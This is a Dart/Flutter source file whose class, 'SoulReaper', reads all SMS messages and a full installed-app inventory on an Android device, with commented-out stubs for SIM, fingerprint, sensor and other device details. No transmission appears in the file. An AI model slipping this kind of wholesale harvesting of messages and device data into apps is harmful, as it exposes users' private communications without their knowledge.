import 'dart:async';

import 'package:sms/sms.dart';
import 'package:device_apps/device_apps.dart';
// import 'package:permission_handler/permission_handler.dart';
// import 'package:android_device_info/android_device_info.dart';

import '../logger.dart';

final log = getLogger('SoulReaper');

class SoulReaper {
  Future<List<Map>> getInstalledApps() async {
    log.i('getInstalledApps');
    //get the list of installed apps
    try {
      List<Application> appsList = await DeviceApps.getInstalledApplications();
      List<Map> finalAppList = [];
      appsList.forEach((element) {
        Map appMap = {
          'apkFilePath': element.apkFilePath,
          'appName': element.appName,
          'dataDir': element.dataDir,
          'installTimeMilis': element.installTimeMillis,
          'packageName': element.packageName,
          'systemApp': element.systemApp,
          'updateTimeMilis': element.updateTimeMillis,
          'versionCode': element.versionCode,
          'versionName': element.versionName,
        };
        finalAppList.add(appMap);
      });

      return finalAppList;
    } catch (error) {
      log.e('error getting installed apps: $error');
      throw error;
    }
  }

  // Future<Map> checkBatteryState() async {
  //   log.i('checkBatteryState');
  //   // Access current battery level
  //   try {
  //     Map batteryInfo = await AndroidDeviceInfo().getBatteryInfo();

  //     log.d(batteryInfo);
  //     return batteryInfo;
  //   } catch (error) {
  //     log.e('error checking battery state: $error');
  //     throw error;
  //   }
  // }

  // Future<Map> getSimInfo() async {
  //   log.i('getSimInfo');
  //   try {
  //     var simInfo = await AndroidDeviceInfo().getSimInfo();
  //     return simInfo;
  //   } catch (error) {
  //     log.e('error getting sim info: $error');
  //     throw error;
  //   }
  // }

  // Future<Map> getConfigInfo() async {
  //   log.i('getConfigInfo');
  //   try {
  //     var configInfo = await AndroidDeviceInfo().getConfigInfo();
  //     return configInfo;
  //   } catch (error) {
  //     log.e('error getting config info: $error');
  //     throw error;
  //   }
  // }

  // Future<Map> getDisplayInfo() async {
  //   log.i('getDisplayInfo');
  //   try {
  //     var displayInfo = await AndroidDeviceInfo().getDisplayInfo();
  //     return displayInfo;
  //   } catch (error) {
  //     log.e('error getting display info: $error');
  //     throw error;
  //   }
  // }

  // Future<Map> getAbiInfo() async {
  //   log.i('getAbiInfo');
  //   try {
  //     var abiInfo = await AndroidDeviceInfo().getAbiInfo();
  //     return abiInfo;
  //   } catch (error) {
  //     log.e('error getting ABI info: $error');
  //     throw error;
  //   }
  // }

  // Future<Map> getNFCInfo() async {
  //   log.i('getNFCInfo');
  //   try {
  //     var nfcInfo = await AndroidDeviceInfo().getNfcInfo();
  //     return nfcInfo;
  //   } catch (error) {
  //     log.e('error getting NFC info: $error');
  //     throw error;
  //   }
  // }

  // Future<Map> getFingerprintInfo() async {
  //   log.i('getFingerprintInfo');
  //   try {
  //     var fingerprintInfo = await AndroidDeviceInfo().getFingeprintInfo();
  //     return fingerprintInfo;
  //   } catch (error) {
  //     log.e('error getting fingerprint info: $error');
  //     throw error;
  //   }
  // }

  // Future<Map> getMemoryInfo() async {
  //   log.i('getMemoryInfo');
  //   try {
  //     var memoInfo = await AndroidDeviceInfo().getMemoryInfo();
  //     return memoInfo;
  //   } catch (error) {
  //     log.e('error getting memory info: $error');
  //     throw error;
  //   }
  // }

  // Future<List> getSensorInfo() async {
  //   log.i('getSensorInfo');
  //   try {
  //     var sensorInfo = await AndroidDeviceInfo().getSensorInfo();
  //     return sensorInfo;
  //   } catch (error) {
  //     log.e('error getting sensor info: $error');
  //     throw error;
  //   }
  // }

  // Future<Map> getSystemInfo() async {
  //   log.i('getSystemInfo');
  //   try {
  //     var systemInfo = await AndroidDeviceInfo().getSystemInfo();
  //     return systemInfo;
  //   } catch (error) {
  //     log.e('error getting system info: $error');
  //     throw error;
  //   }
  // }

  Future<List<Map>> getAllSms() async {
    log.i('getAllSms');
    try {
      //TODO:filter out carrier sms
      SmsQuery query = new SmsQuery();
      List<Map> _messageMapList = [];
      List<SmsMessage> messages = await query.getAllSms;
      for (var i = 0; i < messages.length; i++) {
        _messageMapList.add(messages[i].toMap);
      }
      return _messageMapList;
    } catch (error) {
      log.e('error getting SMS: $error');
      throw error;
    }
  }
}
